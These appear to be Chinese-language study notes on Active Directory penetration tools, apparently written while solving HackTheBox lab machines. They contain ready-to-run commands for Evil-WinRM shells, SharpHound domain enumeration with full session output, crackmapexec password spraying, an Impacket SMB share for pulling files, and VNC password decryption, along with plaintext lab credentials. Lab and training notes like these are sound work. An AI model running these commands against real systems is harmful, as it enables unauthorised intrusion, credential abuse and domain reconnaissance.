# 域渗透工具

## Impacket

https://www.freebuf.com/sectool/175208.html

包含很多有用的脚本



```shell
python3.10 mssqlclient.py  'admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'

#启动本地的smb服务器，可以传文件到本地
python3.10 smbserver.py share ./share
#copy MultimasterAPI.dll \\10.10.14.14\share
```







## Evil-winrm

正常访问的是5985端口，如果要ssl访问的是5986端口。

```shell
Usage: evil-winrm -i IP -u USER -s SCRIPTS_PATH -e EXES_PATH [-P PORT] [-p PASS] [-U URL]
    -i, --ip IP                      远程主机IP或主机名（必填）
    -P, --port PORT                  远程主机端口（默认为5985）
    -u, --user USER                  用户名（必填）
    -p, --password PASS              密码
    -s, --scripts PS_SCRIPTS_PATH    Powershell脚本路径（必填）
    -e, --executables EXES_PATH      C#可执行文件路径（必填）
    -U, --url URL                    远程URL端点（默认为/wsman）
    -V, --version                    显示版本信息
    -h, --help                       显示帮助信息
```



```shell
upload local_path remote_path
download remote_path local_path
services：列出所有服务（无需管理员权限）。
menu：加载Invoke-Binary和l04d3r-LoadDll函数。当加载ps1时，会显示其所有功能。

要加载ps1文件，你只需键入名称（可以使用tab自动补全）。脚本必须位于-s参数中设置的路径中。再次键入menu并查看加载的功能。

Invoke-Binary：允许在内存中执行从c#编译的exes。该名称可使用tab键自动补全，最多允许3个参数。可执行文件必须在-e参数设置的路径中。

l04d3r-LoadDll：允许在内存中加载dll库。dll文件可以由smb，http或本地托管。一旦加载了menu菜单，就可以自动补全所有功能。
```

完整参数：

```shell
Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message

```



SSL访问：

```shell
evil-winrm -i 10.10.10.103  -S  -k amanda.key  -c certnew.cer
```

key的来源：

```shell
openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
```

全enter即可。







## BloodHound

将SharpHound.exe上传后，执行，然后将执行的结果.zip下载下来：

```shell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload SharpHound.exe

Info: Uploading /Users/feng/ctftools/Bloodhound/BloodHound-darwin-arm64/BloodHound/Collectors/SharpHound.exe to C:\Users\svc-alfresco\Documents\SharpHound.exe

Data: 1395368 bytes of 1395368 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/11/2023   4:13 AM         791191 PowerView.ps1
-a----        9/11/2023   8:12 PM        1046528 SharpHound.exe
-a----        9/11/2023   3:47 AM        1391826 SharpHound.ps1


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ./SharpHound.exe
2023-09-11T20:14:03.0316761-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2023-09-11T20:14:03.2035095-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-09-11T20:14:03.2191572-07:00|INFORMATION|Initializing SharpHound at 8:14 PM on 9/11/2023
2023-09-11T20:14:03.5003889-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for htb.local : FOREST.htb.local
2023-09-11T20:14:03.6412294-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-09-11T20:14:04.1566415-07:00|INFORMATION|Beginning LDAP search for htb.local
2023-09-11T20:14:04.2972645-07:00|INFORMATION|Producer has finished, closing LDAP channel
2023-09-11T20:14:04.2972645-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-09-11T20:14:34.2817054-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 38 MB RAM
2023-09-11T20:14:49.6411107-07:00|INFORMATION|Consumers finished, closing output channel
2023-09-11T20:14:49.7036056-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-09-11T20:14:50.5943765-07:00|INFORMATION|Status: 162 objects finished (+162 3.521739)/s -- Using 48 MB RAM
2023-09-11T20:14:50.5943765-07:00|INFORMATION|Enumeration finished in 00:00:46.4524692
2023-09-11T20:14:50.7817293-07:00|INFORMATION|Saving cache with stats: 119 ID to type mappings.
 118 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-09-11T20:14:50.8442532-07:00|INFORMATION|SharpHound Enumeration Completed at 8:14 PM on 9/11/2023! Happy Graphing!
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/11/2023   8:14 PM          18914 20230911201448_BloodHound.zip
-a----        9/11/2023   8:14 PM          19676 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----        9/11/2023   4:13 AM         791191 PowerView.ps1
-a----        9/11/2023   8:12 PM        1046528 SharpHound.exe
-a----        9/11/2023   3:47 AM        1391826 SharpHound.ps1


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20230911201448_BloodHound.zip

Info: Downloading C:\Users\svc-alfresco\Documents\20230911201448_BloodHound.zip to 20230911201448_BloodHound.zip

Info: Download successful!
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```







BloodHound.py（拿到一个用户但是登不上去没法执行SharpHound.exe的时候使用）（mac上没用成功，装的docker）：

```shell
python3 bloodhound.py  -u support -p '#00^BlackKnight' -d blackfield.local --zip -c all -ns 10.10.10.192
```







## crackmapexec

Crackmapexec是一个后渗透的利用工具，可帮助自动执行一些任务，例如密码喷洒、枚举共享、验证本地管理员访问权限、在目标机器上执行命令等等。

支持的协议：

```shell
  {smb,winrm,ldap,mssql,ssh}
    smb                 own stuff using SMB
    winrm               own stuff using WINRM
    ldap                own stuff using LDAP
    mssql               own stuff using MSSQL
    ssh                 own stuff using SSH
```



密码喷洒：

```shell
crackmapexec smb 10.10.10.169 -u user.txt -p 'Welcome123!' --continue-on-success
```

列举smb：

```shell
crackmapexec smb 10.10.10.192 -u "" -p "" --shares
```

## vncpwd

读到的vnc密码：vnc "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f

```shell
echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pass
./vncpwd vnc_enc_pass
```



